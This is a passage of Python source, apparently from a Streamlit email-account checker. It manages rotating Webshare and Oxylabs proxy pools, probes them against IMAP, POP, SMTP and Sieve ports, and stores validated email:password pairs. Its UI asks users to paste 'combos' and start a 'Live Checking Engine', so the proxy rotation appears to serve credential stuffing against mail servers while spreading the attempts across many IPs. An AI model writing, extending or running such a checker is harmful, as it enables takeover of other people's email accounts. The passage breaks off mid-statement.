# @@BLOCK 070 TUNNEL_PROBE deps=018,023,052,053
def _control_targets(used):
    """A target that is NOT already under test.

    A 407 from a shared provider is not always about the credential: a
    per-sub-user concurrency cap and a plan-state problem look identical. Both
    hit a WEB destination and a MAIL destination the same way; a
    destination-scoped 407 does not. One control CONNECT is the only way to tell
    the two apart without guessing, and it is only spent after a 407.
    """
    seen = set()
    for t in (used or []):
        try:
            seen.add((str(t[0]).lower(), int(t[1])))
        except Exception:
            continue
    for t in PROBE_CONTROL_TARGETS:
        if (str(t[0]).lower(), int(t[1])) not in seen:
            return [t]
    return []


def tunnel_probe(proxy_str, targets=None, timeout=None):
    """Open a REAL CONNECT tunnel through the node and classify the outcome.

    reasons: ok | auth (node-wide credential) | auth_dest (credential accepted,
    this DESTINATION refused) | timeout | transport | format | nosocks | dead

    A 407 arriving on ANY scheme is an auth refusal, decided AFTER the loops -
    the node's scheme memory is driven by an actual SUCCESS only.  A FAILURE
    always tries the alternate scheme, EXCEPT on auth.

    FIX 407-SCOPE: a 407 used to be charged to the NODE outright, so a pool that
    authenticated fine on 443 and 407'd on 993 quarantined and score-zeroed
    itself. Every 407 is now re-dialled against PROBE_CONTROL_TARGETS first; if
    the control passes the verdict is `auth_dest` (ok=True) and the node keeps
    its score, its strike count and its place in the pool.
    """
    out = {"ok": False, "reason": "dead", "latency_ms": 0, "target": "",
           "scheme": None, "error": "", "control": ""}
    if not proxy_str:
        out["ok"] = True
        out["reason"] = "ok"
        return out
    info = parse_proxy(proxy_str)
    if not info:
        out["reason"] = "format"
        out["error"] = "parse_proxy() returned None (unrecognised line shape)"
        return out
    if not SOCKS_OK:
        out["reason"] = "nosocks"
        out["error"] = "PySocks not installed"
        return out

    targets = targets or probe_targets()
    try:
        _max_t = max(1, int(live_cfg().get("PROBE_MAX_TARGETS", PROBE_MAX_TARGETS_DEFAULT)))
    except Exception:
        _max_t = PROBE_MAX_TARGETS_DEFAULT
    targets = list(targets)[:_max_t]
    try:
        _second_scheme = bool(live_cfg().get("PROBE_SECOND_SCHEME", PROBE_SECOND_SCHEME_DEFAULT))
    except Exception:
        _second_scheme = PROBE_SECOND_SCHEME_DEFAULT

    budget = float(timeout if timeout is not None else probe_timeout())
    hard_deadline = time.time() + max(1.5, budget)

    errors = []
    auth_schemes = set()
    started_all = time.time()

    def _dial(host, port, label):
        """One target across the scheme order. 'ok' | 'auth' | 'fail'."""
        for _s_idx, ptype in enumerate(_scheme_order(proxy_str)):
            if _s_idx and out["ok"] and not _second_scheme:
                break
            left = hard_deadline - time.time()
            if left <= 0.6:
                break
            attempt_to = max(0.8, min(budget, left))
            s = None
            started = time.time()
            try:
                kw = {"proxy_type": ptype, "proxy_addr": info["host"],
                      "proxy_port": info["port"], "proxy_rdns": True}
                if info["user"]:
                    kw["proxy_username"] = info["user"]
                    kw["proxy_password"] = info["pass"]
                s = socks.create_connection((host, port), timeout=attempt_to, **kw)
                _remember_scheme(proxy_str, ptype)
                out.update(ok=True, reason="ok", scheme=ptype, target=label,
                           latency_ms=int((time.time() - started_all) * 1000))
                return "ok"
            except Exception as e:
                msg = str(e)
                errors.append(f"{label}/{'HTTP' if ptype == socks.HTTP else 'SOCKS5'}: "
                              f"{type(e).__name__}: {msg[:110]}")
                out["target"] = label
                out["latency_ms"] = int((time.time() - started) * 1000)
                if _is_proxy_auth_fail(msg):
                    auth_schemes.add(ptype)
                    return "auth"
                if isinstance(e, (socket.timeout, TimeoutError)) or "timed out" in msg.lower():
                    if out["reason"] != "auth":
                        out["reason"] = "timeout"
                else:
                    if out["reason"] != "auth":
                        out["reason"] = "transport"
            finally:
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
        return "fail"

    for host, port, label in targets:
        if time.time() >= hard_deadline:
            errors.append(f"{label}: skipped (node budget spent)")
            break
        if _dial(host, port, label) == "ok":
            break
        if auth_schemes:
            break

    # ---- the 407 is disambiguated BEFORE it is charged to the node ----------
    if (not out["ok"]) and auth_schemes:
        for host, port, label in _control_targets(targets):
            if time.time() >= hard_deadline:
                break
            out["control"] = f"{host}:{port}"
            if _dial(host, port, "control:" + label) == "ok":
                out["reason"] = "auth_dest"
                break

    if out["ok"] and out["reason"] != "auth_dest":
        out["reason"] = "ok"
    elif auth_schemes and out["reason"] != "auth_dest":
        out["reason"] = "auth"

    out["error"] = " ; ".join(errors)[:300]
    return out
# @@END 070 TUNNEL_PROBE

# @@BLOCK 071 PRECHECK_FAST deps=025,041,058,070
def precheck_proxy_fast(proxy_str):
    try:
        if not proxy_str:
            return True
        if proxy_is_blocked(proxy_str):
            record_probe_result(proxy_str, False, "blocked", error="circuit breaker active")
            return False
        info = parse_proxy(proxy_str)
        if not info:
            record_probe_result(proxy_str, False, "format",
                                error="unrecognised line shape: " + proxy_str[:60])
            log_probe_event(f"FORMAT {proxy_str[:60]}")
            return False
        if not SOCKS_OK:
            record_probe_result(proxy_str, False, "nosocks", error="PySocks missing")
            return False
        if not is_proxy_alive(info["host"], info["port"],
                              timeout=float(live_cfg().get("PROXY_PRECHECK_TIMEOUT",
                                                           PROXY_PRECHECK_TIMEOUT_DEFAULT))):
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            record_probe_result(proxy_str, False, "tcp",
                                error=f"direct TCP to {info['host']}:{info['port']} failed")
            log_probe_event(f"TCPDEAD {info['host']}:{info['port']}")
            return False

        res = _gated_tunnel(proxy_str)
        record_probe_result(proxy_str, res["ok"], res["reason"],
                            latency_ms=res.get("latency_ms", 0),
                            target=res.get("target", ""), scheme=res.get("scheme"),
                            error=res.get("error", ""))

        if res["ok"]:
            record_proxy_attempt(proxy_str, success=True)
            try:
                with proxy_lock:
                    m = proxy_meta.setdefault(
                        proxy_str, {"fails": 0, "success": 0, "country": "Unknown",
                                    "region": "Unknown", "latency_ms": 0})
                    if res.get("latency_ms"):
                        m["latency_ms"] = int(res["latency_ms"])
            except Exception:
                pass
            return True

        if res["reason"] == "auth":
            record_proxy_attempt(proxy_str, success=False, is_network_error=True,
                                 is_proxy_auth=True)
            log_probe_event(f"AUTH407 {info['host']}:{info['port']} -> {res.get('error', '')[:200]}")
        else:
            record_proxy_attempt(proxy_str, success=False, is_network_error=True)
            if res["reason"] in ("timeout", "dead", "transport"):
                log_probe_event(f"{res['reason'].upper()} {info['host']}:{info['port']} "
                                f"-> {res.get('error', '')[:200]}")
        return False
    except Exception:
        return False
# @@END 071 PRECHECK_FAST

# @@BLOCK 072 RUN_BATCH deps=-
def _run_batch(fn, items, workers, budget):
    """Run fn(item) over items with a HARD wall-clock budget.

    FIX PERF-2: results are keyed by LIST INDEX, not id(). id() of a str is only
    stable while something holds a reference and two equal strings can share one,
    so a duplicate line could be credited twice. Items are materialised once so
    the caller's list cannot be mutated underneath the pool.
    """
    items = list(items or ())
    if not items:
        return [], False
    done = set()
    timed_out = False
    budget = max(1.0, float(budget or 1.0))
    ex = ThreadPoolExecutor(max_workers=max(1, min(int(workers or 1), len(items))))
    f2i = {}
    try:
        for idx, it in enumerate(items):
            f2i[ex.submit(fn, it)] = idx
        try:
            for fut in as_completed(f2i, timeout=budget):
                idx = f2i.get(fut)
                try:
                    if fut.result():
                        done.add(idx)
                except Exception:
                    continue
        except Exception:
            timed_out = True
        # Anything that finished inside the budget but after the sweep tripped.
        for fut, idx in f2i.items():
            if fut.done() and not fut.cancelled():
                try:
                    if fut.result():
                        done.add(idx)
                except Exception:
                    pass
    finally:
        ex.shutdown(wait=False)
    return [it for idx, it in enumerate(items) if idx in done], timed_out
# @@END 072 RUN_BATCH

# @@BLOCK 073 MAIL_SPOT_CHECK deps=015,025,070
def _mail_spot_target():
    """The real mail destination to test the pool against."""
    try:
        ov = STATE.get("probe_targets_override") or []
        for h, p, _l in ov:
            if h:
                return (h, int(p))
    except Exception:
        pass
    return MAIL_SPOT_FALLBACK


def mail_dest_spot_check(force: bool = False):
    """CONNECT a few nodes to a MAIL destination and report it."""
    if not force and not live_cfg().get("MAIL_SPOT_CHECK", MAIL_SPOT_CHECK_DEFAULT):
        return
    with alive_pool_lock:
        pool = [p for p in alive_pool if p]
    if not pool:
        STATE["mail_spot"] = {"ts": time.time(), "host": "", "port": 0, "ok": 0,
                              "auth": 0, "other": 0, "n": 0, "error": "empty pool"}
        return
    host, port = _mail_spot_target()
    sample = random.sample(pool, min(MAIL_SPOT_NODES, len(pool)))
    ok = auth = other = 0
    err = ""
    for p in sample:
        try:
            res = _gated_tunnel(p, timeout=MAIL_SPOT_TIMEOUT,
                                targets=[(host, port, "mailspot")])
        except Exception as e:
            other += 1
            err = err or f"{type(e).__name__}: {str(e)[:120]}"
            continue
        # FIX 407-SCOPE: only a plain `ok` is a real pass against the MAIL port.
        # `auth_dest` means the node authenticated but the destination refused it,
        # so it belongs in the auth column - counting it as a pass would hide the
        # very thing this check exists to report.
        if res.get("ok") and res.get("reason") == "ok":
            ok += 1
        elif res.get("reason") in ("auth", "auth_dest"):
            auth += 1
            err = err or (res.get("error", "") or "")
        else:
            other += 1
            err = err or (res.get("error", "") or "")
    STATE["mail_spot"] = {"ts": time.time(), "host": host, "port": int(port), "ok": ok,
                          "auth": auth, "other": other, "n": len(sample),
                          "error": (err or "")[:300]}
    line = (f"mail-dest spot check {host}:{port} -> pass={ok} 407={auth} "
            f"other={other} of {len(sample)} node(s)")
    log_probe_event(line)
    if auth and not ok:
        log_probe_event("*** MAIL destination refused on every sampled node. Each node "
                        "was re-tested on 443 first - see 'auth' (node-wide) vs "
                        "'auth_dest' (destination only) in the histogram ***")
# @@END 073 MAIL_SPOT_CHECK

# @@BLOCK 074 REFRESH_POOL deps=013,014,025,058,069,071,073
def refresh_alive_pool(force: bool = False, budget: float = None):
    budget = float(budget if budget is not None else PROBE_BATCH_BUDGET)

    if (not force) and (not _any_run_active()) \
            and not live_cfg().get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT):
        return

    if not _PROBE_OWNER_LOCK.acquire(blocking=False):
        if not force:
            return
        _t0 = time.time()
        while _PROBE_OWNER_LOCK.locked() and (time.time() - _t0) < budget:
            time.sleep(0.2)
        if not _PROBE_OWNER_LOCK.acquire(blocking=False):
            return

    if (not force) and _any_run_active():
        last = STATE.get("last_probe_ts", 0.0)
        if last and (time.time() - last) < PROBER_STALE_WHILE_RUNNING:
            try:
                _PROBE_OWNER_LOCK.release()
            except Exception:
                pass
            return

    STATE["probe_in_flight"] = True
    try:
        try:
            raw = get_filtered_active_proxies(quiet=True)
        except Exception:
            raw = []
        if not raw:
            with alive_pool_lock:
                alive_pool[:] = []
            log_startup("Alive pool refreshed: proxies.txt is empty.", quiet=True)
            return

        try:
            _sample = max(0, int(live_cfg().get("PROBE_SAMPLE_MAX", 0)))
        except Exception:
            _sample = 0
        if _sample and len(raw) > _sample:
            raw = random.sample(raw, _sample)
            log_probe_event(f"probe sample: {_sample} node(s) this cycle")

        try:
            file_keys = set(load_proxies(quiet=True))
        except Exception:
            file_keys = set()
        if file_keys:
            with proxy_lock:
                for k in list(proxy_meta.keys()):
                    if k not in file_keys:
                        proxy_meta.pop(k, None)
            with probe_stats_lock:
                for k in list(probe_stats.keys()):
                    if k not in file_keys:
                        probe_stats.pop(k, None)
            with proxy_quarantine_lock:
                for k in list(proxy_quarantine):
                    if k not in file_keys:
                        proxy_quarantine.discard(k)
                        _proxy_407.pop(k, None)
            with _proxy_scheme_lock:
                for k in list(_proxy_scheme.keys()):
                    if k not in file_keys:
                        _proxy_scheme.pop(k, None)

        if not live_cfg().get("PROXY_TEST_FLIGHT", True):
            with alive_pool_lock:
                alive_pool[:] = raw
            enrich_proxy_geo(raw)
            save_proxy_meta()
            log_startup(f"Test Flight OFF: pool set to all {len(raw)} candidate(s) "
                        f"without probing.", quiet=True)
            try:
                mail_dest_spot_check()
            except Exception as _mse:
                log_probe_event(f"mail-dest spot check failed: {_mse}")
            return

        _tgts = probe_targets()
        log_probe_event(f"refresh start: {len(raw)} candidate(s), target={live_cfg().get('PROBE_TARGET')} "
                        f"({[t[0] for t in _tgts]}), budget={budget:.0f}s, "
                        f"workers={probe_workers()}, runs_active={STATE.get('runs_active', 0)}")

        live, batch_timed_out = _run_batch(precheck_proxy_fast, raw, probe_workers(), budget)

        strict = bool(live_cfg().get("PROBE_STRICT", PROBE_STRICT_DEFAULT))
        note = ""
        if not live and not strict:
            live = raw
            note = " | STRICT OFF: fell back to the raw pool"
        elif not live and batch_timed_out:
            note = f" | probe batch budget ({budget:.0f}s) spent"

        if not live and _any_run_active():
            with alive_pool_lock:
                still = [p for p in alive_pool if p]
            if still:
                note += f" | kept the current {len(still)}-node pool (run in flight)"
                log_probe_event(f"refresh kept pool ({len(still)} nodes) - 0 passed under load")
                try:
                    mail_dest_spot_check()
                except Exception as _mse:
                    log_probe_event(f"mail-dest spot check failed: {_mse}")
                return

        with alive_pool_lock:
            alive_pool[:] = live
        enrich_proxy_geo(live)
        save_proxy_meta()
        STATE["last_probe_ts"] = time.time()
        STATE["probe_runs"] = int(STATE.get("probe_runs", 0)) + 1

        try:
            mail_dest_spot_check()
        except Exception as _mse:
            log_probe_event(f"mail-dest spot check failed: {_mse}")

        passed, auth, timeout_n, dead = probe_summary()
        line = (f"Alive pool refreshed: {len(live)} node(s) passed the tunnel probe "
                f"out of {len(raw)} candidate(s). Probe breakdown -> pass={passed} "
                f"auth407={auth} timeout={timeout_n} dead={dead} | "
                f"target={live_cfg().get('PROBE_TARGET')} budget={budget:.0f}s strict={strict}{note}")
        log_startup(line, quiet=True)
        log_probe_event(f"refresh end: alive={len(live)}/{len(raw)} pass={passed} "
                        f"auth={auth} timeout={timeout_n} dead={dead}{note}")
    finally:
        STATE["probe_in_flight"] = False
        STATE["last_probe_ts"] = time.time()
        try:
            _PROBE_OWNER_LOCK.release()
        except Exception:
            pass
# @@END 074 REFRESH_POOL

# @@BLOCK 075 ALIVE_THREAD deps=013,074
def start_alive_refresher():
    if any(t.name == "alive-pool" for t in threading.enumerate()):
        return

    def loop():
        while True:
            try:
                if STATE.get("run_active"):
                    refresh_alive_pool()
                    time.sleep(PROBER_BUSY_SLEEP)
                else:
                    refresh_alive_pool()
                    time.sleep(PROBER_IDLE_SLEEP)
            except Exception:
                time.sleep(PROBER_BUSY_SLEEP)

    threading.Thread(target=loop, daemon=True, name="alive-pool").start()


start_alive_refresher()
# @@END 075 ALIVE_THREAD

# @@BLOCK 076 QUEUE_PROBE_TARGETS deps=011,026,068
def _probe_pair_for(email, domain, flags):
    """The AUTO probe target follows the SELECTED protocols."""
    if flags.get("imap"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], 993)
    if flags.get("pop"):
        h = (get_servers(email).get("pop") or [])[:1]
        if h:
            return (h[0], 995)
    if flags.get("smtp"):
        h = _smtp_hosts_for(domain)
        if h:
            return (h[0], 587)
    if flags.get("sieve"):
        h = (get_servers(email).get("imap") or [])[:1]
        if h:
            return (h[0], SIEVE_PORT)
    return None


def _set_probe_targets_from_queue(accounts, cap=1):
    """Resolve the AUTO probe target from the ACTUAL queue."""
    flags = protocol_flags()
    out, seen_domains, seen_pairs = [], set(), set()
    for raw in accounts or []:
        em = raw.split(":", 1)[0].strip().lower()
        if "@" not in em:
            continue
        dom = em.split("@")[-1]
        if not dom or dom in seen_domains:
            continue
        seen_domains.add(dom)
        try:
            pair = _probe_pair_for(em, dom, flags)
        except Exception:
            pair = None
        if not pair or pair in seen_pairs:
            continue
        seen_pairs.add(pair)
        out.append((pair[0], pair[1], f"auto:{dom}"))
        if len(out) >= cap:
            break
    if out:
        STATE["probe_targets_override"] = out
        log_probe_event(f"probe target AUTO resolved from the queue -> {[o[0] for o in out]}")
    return out
# @@END 076 QUEUE_PROBE_TARGETS

# @@BLOCK 077 FETCH_AND_TEST deps=012,014,015,025,026,052,058,067,070,071,072,073
def fetch_and_test_all_proxies(silent: bool = False):
    """Fetch every configured provider's lines, validate them, write proxies.txt
    and ARM the live pool.  Returns (alive_count, total_count).

    FIX PERF-3: the batch was ONE as_completed() call under a 276s budget on the
    Streamlit script thread, so the page was dead for minutes with a spinner and
    no numbers. It now runs in 24-line chunks with a progress bar.
    FIX PERF-4: the probe target is pointed at a MAIL endpoint for the duration of
    the fetch, so validation exercises the port that actually matters.
    FIX PERF-5: the 0-alive TCP fallback was a SERIAL loop of is_proxy_alive()
    calls - 92 nodes x 5s is ~460s of dead page. It is pooled now.
    FIX 407-SCOPE: the completion line no longer calls a TCP-alive fallback line
    "validated" - it reports the two counts separately.
    """
    global all_proxies, filtered_pool

    if requests is None:
        if not silent:
            str_lit.error("Missing 'requests' library.")
        return (0, 0)

    log_startup("Bulk fetch & test of Webshare / Oxylabs proxies started.")
    all_raw = []

    def fetch_ws(key):
        """PAGINATE.  Reading page 1 and stopping loses every later line."""
        proxies = []
        try:
            page = 1
            while page <= 20:
                r = requests.get(
                    "https://proxy.webshare.io/api/v2/proxy/list/",
                    params={"mode": "direct", "page": page, "page_size": 250},
                    headers={"Authorization": f"Token {key}"}, timeout=8)
                if r.status_code != 200:
                    break
                data = r.json() or {}
                results = data.get("results") or []
                for item in results:
                    ip, port = item.get("proxy_address"), item.get("port")
                    user, pwd = item.get("username"), item.get("password")
                    if ip and port:
                        proxies.append(f"{user}:{pwd}@{ip}:{port}" if user and pwd
                                       else f"{ip}:{port}")
                nxt = data.get("next")
                if not nxt or not results or len(results) < 250:
                    break
                page += 1
        except Exception as e:
            warnings.warn(f"Failed fetching Webshare proxy key: {e}")
        return proxies

    try:
        with ThreadPoolExecutor(max_workers=5) as executor:
            for res in executor.map(fetch_ws, WEBSHARE_KEYS):
                all_raw.extend(res)
    except Exception as e:
        warnings.warn(f"ThreadPool Webshare fetch error: {e}")

    all_raw.extend(OXYLABS_PROXIES)
    all_raw = list(dict.fromkeys(all_raw))
    total = len(all_raw)

    if not all_raw:
        log_startup("Fetch & test: no proxy line returned.")
        if not silent:
            str_lit.warning("No proxies returned. Check WEBSHARE_KEYS in secrets.")
        return (0, 0)

    # The write below replaces proxies.txt with ONLY the survivors, so a
    # provider-wide 407 could shrink your pool with no way back.  proxies_all.txt
    # is the way back - and there is a Restore button.
    try:
        with file_write_lock:
            with open("proxies_all.txt", "w", encoding="utf-8") as _bf:
                _bf.write("\n".join(str(i) for i in all_raw) + ("\n" if all_raw else ""))
        log_startup(f"Backed up the raw fetched pool to proxies_all.txt ({len(all_raw)} line(s)).")
    except Exception as _bex:
        log_startup(f"WARNING: could not write proxies_all.txt: {_bex}")

    clear_tunnel_cache()
    with probe_stats_lock:
        probe_stats.clear()
    clear_proxy_quarantine()

    _prev_ov = list(STATE.get("probe_targets_override") or [])
    try:
        STATE["probe_targets_override"] = [
            (MAIL_SPOT_FALLBACK[0], MAIL_SPOT_FALLBACK[1], "fetch:mail")]
    except Exception:
        pass

    alive = []
    _ft_timed_out = False
    batch_timeout = max(60.0, min(PROBE_BATCH_BUDGET * 3.0, len(all_raw) * 3.0))
    _chunk = 24
    _started = time.time()
    _pbar = None
    try:
        _pbar = str_lit.progress(0.0, text=f"Validating 0/{len(all_raw)} ...")
    except Exception:
        _pbar = None

    try:
        for _i in range(0, len(all_raw), _chunk):
            _left = batch_timeout - (time.time() - _started)
            if _left <= 1.0:
                _ft_timed_out = True
                break
            _part = all_raw[_i:_i + _chunk]
            _got, _ = _run_batch(precheck_proxy_fast, _part, probe_workers(bulk=True),
                                 min(_left, _chunk * 6.0))
            alive.extend(_got)
            _done_n = min(len(all_raw), _i + _chunk)
            if _pbar is not None:
                try:
                    _pbar.progress(_done_n / max(1, len(all_raw)),
                                   text=f"Validating {_done_n}/{len(all_raw)} - "
                                        f"{len(alive)} alive")
                except Exception:
                    pass
    finally:
        try:
            STATE["probe_targets_override"] = _prev_ov
        except Exception:
            pass
        if _pbar is not None:
            try:
                _pbar.empty()
            except Exception:
                pass

    if _ft_timed_out:
        log_startup(f"Fetch & test: batch budget {batch_timeout:.0f}s spent; "
                    f"keeping the {len(alive)} node(s) that finished.")

    alive = list(dict.fromkeys(alive))

    # FIX 407-SCOPE: the number of nodes that actually PASSED is remembered before
    # the TCP fallback, so the completion line can stop calling a bare open socket
    # "validated".
    validated = len(alive)
    if not alive:
        _pt = float(CFG.get("PROXY_PRECHECK_TIMEOUT", PROXY_PRECHECK_TIMEOUT_DEFAULT))

        def _tcp_ok(p):
            info = parse_proxy(p)
            if not info:
                return False
            return is_proxy_alive(info["host"], info["port"], timeout=_pt)

        tcp_ok, _ = _run_batch(_tcp_ok, all_raw, probe_workers(bulk=True),
                               max(30.0, len(all_raw) * 1.0))
        alive = tcp_ok or all_raw
        log_startup(f"Fetch & test: 0 of {total} node(s) passed the tunnel probe. "
                    f"Falling back to {len(alive)} line(s) that only answer on TCP - "
                    f"these are NOT validated and will be re-probed.")

    try:
        with file_write_lock:
            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                f.write("\n".join(str(i) for i in alive) + ("\n" if alive else ""))
    except Exception as ex:
        str_lit.error(f"Failed to write proxies file: {ex}")

    # ARM THE POOL: no cold re-probe needed at Start
    with alive_pool_lock:
        alive_pool[:] = list(alive)
    try:
        enrich_proxy_geo(alive)
    except Exception:
        pass
    save_proxy_meta()
    STATE["last_probe_ts"] = time.time()
    STATE["probe_runs"] = int(STATE.get("probe_runs", 0)) + 1
    STATE["bootstrap_done"] = True

    try:
        mail_dest_spot_check(force=True)
    except Exception as _mse:
        log_probe_event(f"mail-dest spot check failed: {_mse}")

    all_proxies = load_proxies()
    filtered_pool = get_filtered_active_proxies(quiet=True)

    _unval = max(0, len(alive) - validated)
    log_startup(f"Fetch & test complete: {validated}/{total} node(s) PASSED the tunnel "
                f"probe, {_unval} unvalidated TCP-alive line(s) kept, "
                f"{len(alive)} written and ARMED.")
    return (len(alive), total)
# @@END 077 FETCH_AND_TEST

# @@BLOCK 078 CLEAN_VALID_IO deps=039
CLEAN_VALID_FILE = user_file("clean_valid_accounts.txt")


def _read_clean_valid():
    """email(lower) -> password, for whatever is on disk right now."""
    seen = {}
    try:
        if os.path.exists(CLEAN_VALID_FILE):
            with open(CLEAN_VALID_FILE, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#") or ":" not in line:
                        continue
                    em, rest = line.split(":", 1)
                    em = em.strip().lower()
                    if em and em not in seen:
                        seen[em] = rest.split("|")[0].strip()
    except Exception:
        pass
    return seen


def _write_clean_valid(header, valids):
    """Merge `valids` into clean_valid_accounts.txt and rewrite the file."""
    merged = _read_clean_valid()
    for v in valids or []:
        if ":" not in v:
            continue
        em, rest = v.split(":", 1)
        em = em.strip().lower()
        if not em:
            continue
        merged[em] = rest.split("|")[0].strip()
    try:
        with file_write_lock:
            with open(CLEAN_VALID_FILE, "w", encoding="utf-8") as f:
                f.write(header)
                for em in sorted(merged):
                    f.write(f"{em}:{merged[em]}\n")
    except Exception:
        pass
    return len(merged)
# @@END 078 CLEAN_VALID_IO

# @@BLOCK 079 STARTUP_PANEL_UI deps=034,038
section_title("🖥️", "Startup & Under-The-Hood Display Panel",
              "system boot, config injection, proxy health, engine state transitions")

with str_lit.expander("🔍 View All Startup Entries & What Is Going On In The Hood",
                      expanded=False):
    str_lit.markdown("Real-time activity ledger recording system boot, config injection, "
                     "proxy health checks, and engine state transitions:")
    str_lit.code("\n".join(startup_panel_lines()), language="text")
    col_st1, col_st2 = str_lit.columns(2)
    with col_st1:
        if str_lit.button("🔄 Refresh Startup Screen"):
            str_lit.rerun()
    with col_st2:
        if str_lit.button("🧹 Clear Startup Logs"):
            str_lit.session_state.startup_entries = []
            # FIX ISO-5 (v13.50): _STARTUP_BUFFER is PROCESS state, so a blanket
            # clear() also deleted the OTHER user's quiet-mode lines - which their
            # session list does not hold, so their panel and diagnostic bundle lost
            # lines they never asked to lose. Keep every entry that is not stamped
            # with this caller's owner and drop only our own.
            # _STARTUP_SEEN holds bare messages with no owner, so it is still
            # cleared wholesale; the cost is at most one re-logged duplicate line
            # on the other session, never a lost one.
            _clear_who = _startup_who()
            with _STARTUP_BUFFER_LOCK:
                _keep = [i for i in _STARTUP_BUFFER
                         if not (isinstance(i, (list, tuple)) and len(i) == 2
                                 and i[0] == _clear_who)]
                _STARTUP_BUFFER[:] = _keep
                _STARTUP_SEEN.clear()
            log_startup("Startup logs cleared by user.")
            str_lit.rerun()
# @@END 079 STARTUP_PANEL_UI

# @@BLOCK 080 PROXY_MGMT_UI deps=014,016,024,043,052,058,068,070,073,074,077
with str_lit.sidebar:
    str_lit.markdown("---")
    str_lit.markdown("### 🌐 Proxy Management & Health")

    # FIX FLASH-1 (v13.49): every branch below ended in success()/warning() and
    # then str_lit.rerun(), and a rerun destroys the delta the message was drawn
    # into - so "N node(s) validated", "Pool re-probed" and "Restored N line(s)"
    # were never actually visible. The message is carried across the rerun and
    # rendered here instead.
    _flash = str_lit.session_state.pop("_proxy_flash", None)
    if _flash:
        _lvl, _msg = _flash
        getattr(str_lit, _lvl, str_lit.info)(_msg)

    if (not all_proxies) and WEBSHARE_KEYS and not STATE.get("bootstrap_done"):
        STATE["bootstrap_done"] = True
        with str_lit.spinner("First run - fetching and validating your proxy pool..."):
            try:
                fetch_and_test_all_proxies(silent=True)
            except Exception as _be:
                log_startup(f"WARNING: auto-bootstrap failed: {_be}")
        all_proxies = load_proxies()
        filtered_pool = get_filtered_active_proxies(quiet=True)

    if (STATE.get("last_probe_ts", 0.0) == 0.0 and all_proxies
            and not STATE.get("probe_in_flight")
            and not STATE.get("first_probe_kicked")):
        STATE["first_probe_kicked"] = True
        log_probe_event("first-load probe kicked to a background thread (UI not blocked)")
        threading.Thread(
            target=lambda: refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET),
            daemon=True, name="first-probe").start()
        str_lit.caption("⏳ First probe running in the background - the page is already usable.")

    _q_now = quarantine_size()
    _alive_now = len(alive_pool)
    _last_ts = STATE.get("last_probe_ts", 0.0)
    _age = int(time.time() - _last_ts) if _last_ts else -1
    _age_txt = f"{_age}s ago" if _age >= 0 else "never"

    # FIX LAG-P: parse_proxy() ran TWICE per line here for the IP set and twice
    # again via _subuser_of() for the user set - four parses per line, every
    # rerun. One pass fills both.
    _ips, _subs = set(), set()
    for _p in all_proxies:
        _pi = parse_proxy(_p)
        if _pi:
            _ips.add(_pi["host"])
            _su = (_pi.get("user") or "").strip().lower()
            if _su:
                _subs.add(_su)

    # FIX UI-1 (the ledger lie): filtered_pool is re-created EMPTY at module level
    # on EVERY rerun (block 058) and nothing fills it before this point, so
    # `not filtered_pool` was true on every single load - the error below fired
    # unconditionally and, because st.error CLOSES the pending press, Reset Theme,
    # Reset Display Fit, every help_btn and Show raw proxies.txt were all recorded
    # as FAILED with a proxy message. The pool was never broken; the banner was.
    # FIX UI-3: the compute now sits ABOVE the info line, so "Filtered:" is never
    # the stale module-level 0 either.
    if all_proxies and not filtered_pool:
        filtered_pool = get_filtered_active_proxies(quiet=True)

    # FIX UI-2: a page-level banner also steals presses when it is healthy - the
    # READY success below did exactly the same thing. Every banner now only uses a
    # real message widget when nothing has reported yet, and degrades to a caption
    # otherwise, so an unrelated press closes honestly.
    _pend = str_lit.session_state.get("_audit_pending") or {}
    _steal = bool(_pend) and not _pend.get("outcome")

    str_lit.info(f"Loaded Proxies: **{len(all_proxies)}** lines / **{len(_ips)}** IPs / "
                 f"**{len(_subs)}** sub-users | Filtered: **{len(filtered_pool)}** | "
                 f"Alive: **{_alive_now}**")

    if all_proxies and not filtered_pool:
        _etxt = ("⚠ **Every proxy was filtered out** by Min Proxy Score / pool mode / "
                 "circuit breaker. Lower 'Min Proxy Score' or press ♻️ Lift 407 "
                 "Quarantine. The raw list is NOT used as a silent fallback.")
        (str_lit.caption if _steal else str_lit.error)(_etxt)

    _p_ok, _p_auth, _p_to, _p_dead = probe_summary()

    # FIX ISO-4: _any_run_active(), not STATE["run_active"] - the bool used to be
    # cleared by whichever run ended first, so one user's exit hid another user's
    # live run and this banner claimed READY mid-run.
    # FIX UI-4: "N validated node(s) armed" was a lie when NONE passed the probe,
    # and len(alive_pool) is not the same number as the nodes the engine may use -
    # report the probe-pass count so the banner cannot overstate the pool.
    if _alive_now and not _any_run_active():
        if _p_ok:
            _rtxt = (f"✅ READY - **{_p_ok}** validated node(s) armed. "
                     f"Paste your combos and press 🔥 Start Live Checking Engine. "
                     f"Nothing else to set.")
            _rfunc = str_lit.caption if _steal else str_lit.success
        else:
            _rtxt = (f"⚠ **{_alive_now}** node(s) armed but **0 passed the probe** - "
                     f"they will mostly 407. Set **Proxy Mode Engine = off** (DIRECT), "
                     f"or press ♻️ Lift 407 Quarantine.")
            _rfunc = str_lit.caption if _steal else str_lit.warning
        _rfunc(_rtxt)
    elif not all_proxies and not WEBSHARE_KEYS:
        str_lit.info("No proxies configured - press 📥 Fetch & Test All Proxies, or run "
                     "fully DIRECT.")

    str_lit.caption(
        f"Probe ({CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)}, {probe_timeout():.0f}s): "
        f"pass **{_p_ok}** | 407 **{_p_auth}** | timeout/reset **{_p_to}** | "
        f"dead **{_p_dead}**  ·  last probe {_age_txt}  ·  runs {STATE.get('probe_runs', 0)}"
        + ("  ·  STRICT OFF" if not CFG.get("PROBE_STRICT", True) else "")
    )
    str_lit.caption(f"Probe targets in use: "
                    f"{', '.join(t[0] + ':' + str(t[1]) for t in probe_targets())}")
    str_lit.caption(f"Protocols dialled: **{' + '.join(active_protocols())}**")

    _ms = STATE.get("mail_spot") or {}
    if _ms.get("n"):
        _ms_age = int(time.time() - _ms.get("ts", 0))
        _ms_txt = (f"Mail-destination spot check ({_ms['host']}:{_ms['port']}): "
